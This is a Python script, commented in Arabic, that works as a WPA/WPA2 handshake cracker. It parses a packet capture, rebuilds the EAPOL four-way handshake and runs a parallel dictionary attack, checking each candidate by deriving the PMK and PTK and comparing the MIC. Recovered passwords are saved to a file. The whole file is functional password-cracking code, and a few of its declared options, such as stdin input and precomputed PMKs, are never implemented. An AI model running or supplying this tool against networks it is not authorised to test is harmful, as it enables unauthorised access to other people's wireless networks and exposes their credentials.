#!/usr/bin/env python3
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import argparse
import sys
import os
import time
import signal
import hmac
import hashlib
import binascii
from scapy.all import EAPOL, Dot11, Dot11Beacon, Dot11Elt, rdpcap, Dot11WEP
from hashlib import pbkdf2_hmac
from prettytable import PrettyTable
from multiprocessing import Pool, Manager, Process, cpu_count
import threading
import traceback

# تغيير مجلد العمل
os.chdir(os.path.dirname(os.path.abspath(__file__)))

# إعداد الأرجومنتس
parser = argparse.ArgumentParser(description="WPA/WPA2 Handshake Cracker")
parser.add_argument("-s", "--ssid", help="Specify SSID of network to crack")
parser.add_argument("-c", "--capture", help="Specify location of the packet capture file")
parser.add_argument("-w", "--wordlist", help="Specify location of the wordlist file")
parser.add_argument("-p", "--pmk", help="Specify the pre-computed PMK wordlist file")
parser.add_argument("--gen-pmk", help="Pre-compute PMK for a certain wordlist", action="store_true")
parser.add_argument("--stdin", help="Read words from stdin", action="store_true")
parser.add_argument("-t", "--threads", type=int, default=cpu_count(), help="Number of threads to use")
parser.add_argument("--update-interval", type=int, default=1, help="Statistics update interval in seconds")
prog_args = parser.parse_args()

class HalfWPAHandshake:
    def __init__(self, ssid=None, ap_mac=None, client_mac=None,
                 aNonce=None, sNonce=None, mic=None, data=None):
        self.ascii_ap_mac = ap_mac
        self.ascii_client_mac = client_mac
        
        try:
            self.ap_mac = binascii.a2b_hex(ap_mac.replace(":", "")) if ap_mac else None
            self.client_mac = binascii.a2b_hex(client_mac.replace(":", "")) if client_mac else None
        except Exception:
            self.ap_mac = None
            self.client_mac = None
        
        self.ssid = ssid
        self.aNonce = aNonce
        self.sNonce = sNonce
        self.mic = mic
        self.data = data

    def complete_info(self, half_handshake):
        """دمج معلومات من handshake آخر"""
        if self.ap_mac is None and half_handshake.ap_mac is not None:
            self.ap_mac = half_handshake.ap_mac
            self.ascii_ap_mac = half_handshake.ascii_ap_mac
        
        if self.client_mac is None and half_handshake.client_mac is not None:
            self.client_mac = half_handshake.client_mac
            self.ascii_client_mac = half_handshake.ascii_client_mac
        
        if self.aNonce is None and half_handshake.aNonce is not None:
            self.aNonce = half_handshake.aNonce
        
        if self.sNonce is None and half_handshake.sNonce is not None:
            self.sNonce = half_handshake.sNonce
        
        if self.mic is None and half_handshake.mic is not None:
            self.mic = half_handshake.mic
        
        if self.data is None and half_handshake.data is not None:
            self.data = half_handshake.data

    def extract_info(self, packet):
        """استخراج معلومات من EAPOL packet"""
        if not packet.haslayer(EAPOL):
            return
        
        try:
            eapol_layer = packet[EAPOL]
            
            # استخراج MAC addresses من 802.11 header
            if packet.haslayer(Dot11):
                # في 802.11: addr1=destination, addr2=source, addr3=BSSID
                dot11_layer = packet[Dot11]
                self.ascii_ap_mac = dot11_layer.addr3  # BSSID is usually the AP
                
                # تحديد اتجاه الإطار
                if dot11_layer.addr1 == dot11_layer.addr3:  # destination is AP
                    self.ascii_client_mac = dot11_layer.addr2  # source is client
                else:  # destination is client
                    self.ascii_client_mac = dot11_layer.addr1  # destination is client
                
                try:
                    self.ap_mac = binascii.a2b_hex(self.ascii_ap_mac.replace(":", ""))
                    self.client_mac = binascii.a2b_hex(self.ascii_client_mac.replace(":", ""))
                except:
                    return
            
            # استخراج معلومات EAPOL-Key
            # البحث عن الحقول في raw data
            raw_data = bytes(eapol_layer)
            
            if len(raw_data) < 95:  # الحد الأدنى لحجم EAPOL-Key
                return
            
            # Key Information (bytes 5-6)
            key_info = int.from_bytes(raw_data[5:7], 'big')
            
            # Nonce (bytes 17-48)
            nonce = raw_data[17:49]
            
            # MIC (bytes 81-96)
            mic = raw_data[81:97]
            
            # تحديد نوع الرسالة بناءً على key_info
            if key_info & 0x0080:  # ACK bit set (Message 1 or 3)
                if nonce != b'\x00' * 32:  # إذا كان هناك nonce
                    self.aNonce = nonce
                    
            else:  # ACK bit not set (Message 2 or 4)
                if nonce != b'\x00' * 32:  # إذا كان هناك nonce
                    self.sNonce = nonce
                    
                if mic != b'\x00' * 16:  # إذا كان هناك MIC
                    self.mic = mic
                    self.data = self._calculate_data_bytes(packet)
                
        except Exception as e:
            print(f"[-] Error extracting info: {e}")
            traceback.print_exc()

    def _calculate_data_bytes(self, packet):
        """حساب البيانات للتحقق من MIC"""
        try:
            if not packet.haslayer(EAPOL):
                return None
            
            # الحصول على EAPOL raw data
            eapol_layer = packet[EAPOL]
            eapol_data = bytes(eapol_layer)
            
            if len(eapol_data) < 95:  # الحد الأدنى لحجم EAPOL-Key
                return None
            
            # نسخ البيانات وتصفير MIC (من البايت 81 إلى 96)
            data_copy = bytearray(eapol_data)
            data_copy[81:97] = b'\x00' * 16  # تصفير MIC
            
            return bytes(data_copy)
            
        except Exception as e:
            print(f"[-] Error calculating data bytes: {e}")
            return None

    def is_complete(self):
        """التحقق من اكتمال الـ handshake"""
        required_fields = [self.ap_mac, self.client_mac, self.aNonce, 
                          self.sNonce, self.mic, self.data, self.ssid]
        return all(field is not None for field in required_fields)

def find_half_handshakes(captured_packets):
    """البحث عن handshakes في الباكيتات"""
    half_handshakes = []
    ssid_map = {}
    
    print("[+] البحث عن SSIDs في Beacon frames...")
    # المرور الأول: جمع SSIDs من beacon frames
    for packet in captured_packets:
        try:
            if packet.haslayer(Dot11Beacon):
                # الحصول على SSID من Information Elements
                if packet.haslayer(Dot11Elt):
                    info_elem = packet[Dot11Elt]
                    while info_elem:
                        if info_elem.ID == 0:  # SSID element
                            try:
                                ssid = info_elem.info.decode('utf-8', errors='ignore')
                                if ssid and ssid.strip():
                                    ssid_map[packet.addr2] = ssid  # addr2 is source (AP)
                                    break
                            except:
                                pass
                        info_elem = info_elem.payload if hasattr(info_elem, 'payload') else None
                        if info_elem and not isinstance(info_elem, Dot11Elt):
                            break
        except:
            continue
    
    print(f"[+] تم العثور على {len(ssid_map)} SSIDs")
    for mac, ssid in ssid_map.items():
        print(f"    {mac} -> {ssid}")
    
    print("[+] البحث عن EAPOL packets...")
    # المرور الثاني: معالجة EAPOL packets
    eapol_count = 0
    for packet in captured_packets:
        try:
            if not packet.haslayer(EAPOL):
                continue
            
            eapol_count += 1
            
            # محاولة الحصول على SSID من الخريطة
            ssid = None
            ap_mac = None
            
            if packet.haslayer(Dot11):
                # addr1 = destination, addr2 = source, addr3 = BSSID
                bssid = packet.addr3
                src = packet.addr2
                dst = packet.addr1
                
                # BSSID عادة ما يكون AP MAC
                ap_mac = bssid
                ssid = ssid_map.get(bssid) or ssid_map.get(src) or ssid_map.get(dst)
            
            if not ssid:
                # محاولة أخيرة للحصول على SSID من أي MAC في الباكيت
                for mac_addr in [packet.src, packet.dst]:
                    if mac_addr in ssid_map:
                        ssid = ssid_map[mac_addr]
                        ap_mac = mac_addr
                        break
            
            if not ssid:
                ssid = "Unknown"
            
            half_handshake = HalfWPAHandshake(ssid=ssid)
            half_handshake.extract_info(packet)
            
            # إذا لم يتم استخراج MAC addresses، استخدم المعلومات المتاحة
            if not half_handshake.ascii_ap_mac and ap_mac:
                half_handshake.ascii_ap_mac = ap_mac
                try:
                    half_handshake.ap_mac = binascii.a2b_hex(ap_mac.replace(":", ""))
                except:
                    pass
            
            # البحث عن handshake مطابق للدمج
            found_pair = False
            for existing_hs in half_handshakes:
                # مطابقة بناءً على SSID و MAC addresses المتاحة
                if (existing_hs.ssid == half_handshake.ssid and
                    ((existing_hs.ascii_ap_mac == half_handshake.ascii_ap_mac) or
                     (existing_hs.ascii_client_mac == half_handshake.ascii_client_mac) or
                     (existing_hs.ascii_ap_mac is None and half_handshake.ascii_ap_mac is not None) or
                     (existing_hs.ascii_client_mac is None and half_handshake.ascii_client_mac is not None))):
                    existing_hs.complete_info(half_handshake)
                    found_pair = True
                    break
            
            if not found_pair:
                half_handshakes.append(half_handshake)
                
        except Exception as e:
            print(f"[-] Error processing packet: {e}")
            continue
    
    print(f"[+] تم العثور على {eapol_count} EAPOL packets")
    print(f"[+] تم العثور على {len(half_handshakes)} handshakes")
    
    # طباعة تفاصيل إضافية للتشخيص
    for i, hs in enumerate(half_handshakes):
        print(f"Handshake {i}: AP={hs.ascii_ap_mac}, Client={hs.ascii_client_mac}")
        print(f"  ANonce: {'✓' if hs.aNonce else '✗'}")
        print(f"  SNonce: {'✓' if hs.sNonce else '✗'}")
        print(f"  MIC: {'✓' if hs.mic else '✗'}")
        print(f"  Data: {'✓' if hs.data else '✗'}")
    
    return half_handshakes

def PRF512(pmk, A, B):
    """Pseudo-Random Function for WPA"""
    try:
        blen = 64
        i = 0
        R = b''
        while i <= ((blen * 8 + 159) // 160):
            hmacsha1 = hmac.new(pmk, A + chr(0).encode() + B + chr(i).encode(), hashlib.sha1)
            i += 1
            R += hmacsha1.digest()
        return R[:blen]
        
    except Exception as e:
        print(f"[-] Error in PRF512: {e}")
        return None

def test_word(args):
    """اختبار كلمة مرور واحدة"""
    try:
        ssid, client_mac, ap_mac, a_nonce, s_nonce, mic, data, word = args
        
        # تحويل إلى bytes
        ssid_bytes = ssid.encode('utf-8') if isinstance(ssid, str) else ssid
        word_bytes = word.encode('utf-8') if isinstance(word, str) else word
        
        # التحقق من طول كلمة المرور
        if len(word_bytes) < 8 or len(word_bytes) > 63:
            return False, word
        
        # توليد PMK
        pmk = pbkdf2_hmac('sha1', word_bytes, ssid_bytes, 4096, 32)
        
        # ترتيب MAC addresses و nonces
        if ap_mac < client_mac:
            amac = ap_mac
            smac = client_mac
        else:
            amac = client_mac
            smac = ap_mac
        
        if a_nonce < s_nonce:
            anonce = a_nonce
            snonce = s_nonce
        else:
            anonce = s_nonce
            snonce = a_nonce
        
        # إنشاء بيانات PTK
        ptk_data = amac + smac + anonce + snonce
        
        # توليد PTK
        ptk = PRF512(pmk, b"Pairwise key expansion", ptk_data)
        if ptk is None:
            return False, word
        
        # استخراج KCK (أول 16 بايت من PTK)
        kck = ptk[:16]
        
        # حساب MIC
        calculated_mic = hmac.new(kck, data, hashlib.sha1).digest()[:16]
        
        # مقارنة MIC
        return mic == calculated_mic, word
        
    except Exception as e:
        return False, word

def worker_process(word_queue, result_queue, handshake_args, stats):
    """عملية المعالجة الرئيسية"""
    try:
        while True:
            try:
                # الحصول على كلمة من الـ queue
                word = word_queue.get(timeout=1)
                if word is None:  # إشارة التوقف
                    break
                
                # اختبار الكلمة
                args = handshake_args + (word,)
                result, tested_word = test_word(args)
                
                # إرسال النتيجة
                result_queue.put((result, tested_word))
                
                # تحديث الإحصائيات
                with stats.get_lock():
                    stats.value += 1
                
            except Exception:
                break
                
    except Exception as e:
        print(f"[-] Worker error: {e}")

def wordlist_loader(wordlist_path, word_queue, stop_event):
    """تحميل الكلمات من الملف"""
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            count = 0
            for line in f:
                if stop_event.is_set():
                    break
                    
                word = line.strip()
                if word and len(word) >= 8:
                    word_queue.put(word)
                    count += 1
                    
                    if count % 10000 == 0:
                        print(f"[+] تم تحميل {count} كلمة", end='\r')
            
            print(f"\n[+] تم تحميل {count} كلمة من الملف")
            
    except Exception as e:
        print(f"[-] خطأ في تحميل الملف: {e}")

def format_time(seconds):
    """تنسيق الوقت بشكل أفضل"""
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    
    if hours > 0:
        return f"{hours:02d}:{minutes:02d}:{secs:02d}"
    else:
        return f"{minutes:02d}:{secs:02d}"

def format_number(num):
    """تنسيق الأرقام مع الفواصل"""
    return f"{num:,}"

def statistics_monitor(stats, start_time, stop_event, update_interval):
    """مراقب الإحصائيات في الوقت الفعلي"""
    last_count = 0
    last_time = start_time
    
    while not stop_event.is_set():
        time.sleep(update_interval)
        
        current_time = time.time()
        current_count = stats.value
        
        # حساب الإحصائيات
        total_elapsed = current_time - start_time
        interval_elapsed = current_time - last_time
        
        # معدل كلمات المرور الإجمالي
        if total_elapsed > 0:
            total_rate = current_count / total_elapsed
        else:
            total_rate = 0
        
        # معدل كلمات المرور في الفترة الأخيرة
        if interval_elapsed > 0:
            interval_rate = (current_count - last_count) / interval_elapsed
        else:
            interval_rate = 0
        
        # عرض الإحصائيات
        print(f"\r[+] اختبار: {format_number(current_count)} | "
              f"المعدل: {interval_rate:.1f}/s | "
              f"المعدل الإجمالي: {total_rate:.1f}/s | "
              f"الوقت: {format_time(total_elapsed)}", end='', flush=True)
        
        # تحديث القيم للفترة القادمة
        last_count = current_count
        last_time = current_time

def present_handshakes(handshakes):
    """عرض الـ handshakes المتاحة"""
    headers = ["ID", "AP MAC", "Client MAC", "SSID", "ANonce", "SNonce", "MIC", "مكتمل"]
    table = PrettyTable(headers)
    
    for i, hs in enumerate(handshakes):
        complete = "نعم" if hs.is_complete() else "لا"
        ssid = hs.ssid if hs.ssid else "غير معروف"
        
        anonce = "✓" if hs.aNonce is not None else "✗"
        snonce = "✓" if hs.sNonce is not None else "✗"
        mic = "✓" if hs.mic is not None else "✗"
        
        table.add_row([i, hs.ascii_ap_mac, hs.ascii_client_mac, ssid, anonce, snonce, mic, complete])
    
    print(table)

def choose_handshake(handshakes, ssid):
    """اختيار الـ handshake للكراك"""
    if not handshakes:
        print("[-] لم يتم العثور على handshakes في الملف")
        return None
    
    # البحث عن handshake بـ SSID محدد
    if ssid:
        for hs in handshakes:
            if hs.ssid == ssid and hs.is_complete():
                return hs
        print(f"[-] لم يتم العثور على handshake مكتمل للـ SSID: {ssid}")
        return None
    
    # إذا كان هناك handshake واحد مكتمل فقط
    complete_handshakes = [hs for hs in handshakes if hs.is_complete()]
    if len(complete_handshakes) == 1:
        return complete_handshakes[0]
    
    # السماح للمستخدم بالاختيار
    while True:
        try:
            choice = input("اختر ID الـ handshake للكراك: ").strip()
            if choice.isdigit():
                idx = int(choice)
                if 0 <= idx < len(handshakes):
                    chosen = handshakes[idx]
                    if chosen.is_complete():
                        return chosen
                    else:
                        print("[-] الـ handshake المختار غير مكتمل")
                else:
                    print("[-] الرقم غير صحيح")
            else:
                print("[-] أدخل رقم صحيح")
        except KeyboardInterrupt:
            return None

def signal_handler(signum, frame):
    """معالج إشارات التوقف"""
    print("\n[+] تم إيقاف العملية")
    sys.exit(0)

def main():
    # إعداد معالج الإشارات
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # التحقق من الأرجومنتس
    if not prog_args.capture:
        print("[-] ملف الـ capture مطلوب")
        sys.exit(1)
    
    if not any([prog_args.wordlist, prog_args.stdin]):
        print("[-] مصدر الكلمات مطلوب (wordlist أو stdin)")
        sys.exit(1)
    
    # تحميل ملف الـ capture
    try:
        print(f"[+] تحميل ملف الـ capture: {prog_args.capture}")
        packets = rdpcap(prog_args.capture)
        print(f"[+] تم تحميل {len(packets)} packet")
    except Exception as e:
        print(f"[-] خطأ في تحميل الملف: {e}")
        sys.exit(1)
    
    # البحث عن handshakes
    print("[+] تحليل الـ handshakes...")
    handshakes = find_half_handshakes(packets)
    
    if not handshakes:
        print("[-] لم يتم العثور على handshakes")
        sys.exit(1)
    
    # عرض واختيار handshake
    present_handshakes(handshakes)
    chosen = choose_handshake(handshakes, prog_args.ssid)
    
    if not chosen:
        print("[-] لم يتم اختيار handshake")
        sys.exit(1)
    
    print(f"[+] تم اختيار handshake للـ SSID: {chosen.ssid}")
    
    # إعداد المعالجة المتوازية
    manager = Manager()
    word_queue = manager.Queue(maxsize=1000)
    result_queue = manager.Queue()
    stats = manager.Value('i', 0)
    stop_event = threading.Event()
    
    # إعداد بيانات الـ handshake
    handshake_args = (
        chosen.ssid,
        chosen.client_mac,
        chosen.ap_mac,
        chosen.aNonce,
        chosen.sNonce,
        chosen.mic,
        chosen.data
    )
    
    # بدء العمليات
    processes = []
    for i in range(prog_args.threads):
        p = Process(target=worker_process, args=(word_queue, result_queue, handshake_args, stats))
        p.start()
        processes.append(p)
    
    # بدء تحميل الكلمات
    if prog_args.wordlist:
        loader_thread = threading.Thread(
            target=wordlist_loader, 
            args=(prog_args.wordlist, word_queue, stop_event)
        )
        loader_thread.start()
    
    # إعداد وبدء مراقب الإحصائيات
    start_time = time.time()
    stats_thread = threading.Thread(
        target=statistics_monitor,
        args=(stats, start_time, stop_event, prog_args.update_interval)
    )
    stats_thread.daemon = True
    stats_thread.start()
    
    # بدء الكراك
    print(f"[+] بدء الكراك بـ {prog_args.threads} processes")
    print(f"[+] تحديث الإحصائيات كل {prog_args.update_interval} ثانية")
    found_password = False
    
    try:
        while not found_password:
            try:
                # التحقق من النتائج
                result, word = result_queue.get(timeout=1)
                
                if result:
                    print(f"\n[+] تم العثور على كلمة المرور: {word}")
                    
                    # حفظ النتيجة
                    filename = f"{chosen.ssid}.cracked"
                    with open(filename, 'w') as f:
                        f.write(f"SSID: {chosen.ssid}\n")
                        f.write(f"Password: {word}\n")
                        f.write(f"Time: {time.time() - start_time:.2f} seconds\n")
                        f.write(f"Passwords tested: {stats.value}\n")
                    
                    found_password = True
                    break
                
            except Exception:
                # التحقق من انتهاء الكلمات
                if word_queue.empty() and result_queue.empty():
                    print("\n[-] انتهت الكلمات ولم يتم العثور على كلمة المرور")
                    break
                continue
                
    except KeyboardInterrupt:
        print("\n[+] تم إيقاف العملية")
    
    finally:
        # إيقاف العمليات
        stop_event.set()
        
        # إرسال إشارة التوقف للعمليات
        for _ in processes:
            try:
                word_queue.put(None)
            except:
                pass
        
        # انتظار انتهاء العمليات
        for p in processes:
            try:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
            except:
                pass
    
    elapsed = time.time() - start_time
    final_rate = stats.value / elapsed if elapsed > 0 else 0
    
    print(f"\n[+] انتهت العملية في {format_time(elapsed)}")
    print(f"[+] تم اختبار {format_number(stats.value)} كلمة مرور")
    print(f"[+] المعدل النهائي: {final_rate:.2f} كلمة/ثانية")

if __name__ == '__main__':
    main()